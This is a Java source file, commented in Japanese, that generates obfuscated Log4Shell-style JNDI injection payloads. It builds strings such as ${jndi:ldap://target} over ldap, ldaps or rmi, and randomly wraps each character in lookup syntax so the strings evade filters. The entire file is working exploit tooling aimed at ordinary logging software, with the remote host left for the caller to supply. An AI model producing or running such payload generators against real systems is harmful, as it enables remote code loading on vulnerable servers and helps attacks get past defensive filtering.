package org.yuudai;

import com.google.common.base.CharMatcher;

import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 難読化された攻撃パターンを生成するクラス
 */
public class Obfuscator {
    /**
     * 各攻撃パターンの最初につける文字列
     */
    static final String first = "${";
    static final String jndi = "jndi:";
    static final String last = "}";
    /**
     * 攻撃パターンで使用するプロトコル
     */
    static final String[] protocols = {"ldap", "ldaps", "rmi"};

    static int repeat_limit = 20;

    static String getProtocol() {
        int index = protocols.length;
        return protocols[(int)(Math.random() * (double)index - 0.5)] + "://";
    }

    static ArrayList<String> Obfuscate(ArrayList<String> obfuscations, String target, int num, boolean mixed) {
        ArrayList<String> output = new ArrayList<>();
        target = jndi + "%" + target;
        if (mixed) {
            target = CharMatcher.is('%').replaceFrom(target, getProtocol());
            for (int i = 0; i < num; i++) {
                StringBuilder generated = new StringBuilder();
                for (char ch : target.toCharArray()) {
                    generated.append(ObfuscateByChar(ch, ObfuscatorUtils.GetRandomString(obfuscations)));
                }
                output.add(first + generated + last);
            }
        } else {
            for (String obfuscation : obfuscations) {
                for (int i = 0; i < num; i++) {
                    String target_new = CharMatcher.is('%').replaceFrom(target, getProtocol());
                    StringBuilder generated = new StringBuilder();
                    for (char ch : target_new.toCharArray()) {
                        generated.append(ObfuscateByChar(ch, obfuscation));
                    }
                    output.add(first + generated + last);
                }
            }
        }
        return output;
    }

    static String ObfuscateByChar(char ch, String method) {
        boolean upper;
        boolean lower;
        boolean digit;
        int more_than;
        ArrayList<Character> others = new ArrayList<>();
        Pattern pattern = Pattern.compile("<[^>.]+>[+*]");
        Matcher matcher = pattern.matcher(method);

        while (matcher.find()) {
            upper = false;
            lower = false;
            digit = false;
            more_than = -1;
            others.clear();

            if (matcher.group().contains("A")) {
                upper = true;
            }
            if (matcher.group().contains("a")) {
                lower = true;
            }
            if (matcher.group().contains("0")) {
                digit = true;
            }
            if (matcher.group().charAt(matcher.group().length() - 1) == '+') {
                more_than = 1;
            }
            if (matcher.group().charAt(matcher.group().length() - 1) == '*') {
                more_than = 0;
            }
            Pattern other = Pattern.compile("[^+*<>Aa0]");
            Matcher matcher_other = other.matcher(matcher.group());
            while (matcher_other.find()) {
                for (char element : matcher_other.group().toCharArray()) {
                    others.add(element);
                }
            }
            String remaining = method.replaceFirst("<[^>.]+>[+*]", "%");
            method = CharMatcher.is('%').replaceFrom(remaining, Generate(upper, lower, digit, more_than, others));
        }
        return CharMatcher.is('#').replaceFrom(method, ch);
    }

    static String Generate(boolean upper, boolean lower, boolean digit, int more_than, ArrayList<Character> others) {
        StringBuilder sb = new StringBuilder();
        ArrayList<Character> candidates = new ArrayList<>();
        if (upper) {
            for (int i = 0; i < 26; i++) {
                candidates.add((char) ('A' + i));
            }
        }
        if (lower) {
            for (int i = 0; i < 26; i++) {
                candidates.add((char) ('a' + i));
            }
        }
        if (digit) {
            for (int i = 0; i < 10; i++) {
                candidates.add((char) ('0' + i));
            }
        }
        if (!others.isEmpty()) {
            candidates.addAll(others);
        }
        int repeats = (int)(Math.random() * repeat_limit + 0.5) + more_than;
        for (int i = more_than; i < repeats; i++){
            sb.append(ObfuscatorUtils.GetRandomChar(candidates));
        }
        return sb.toString();
    }
}
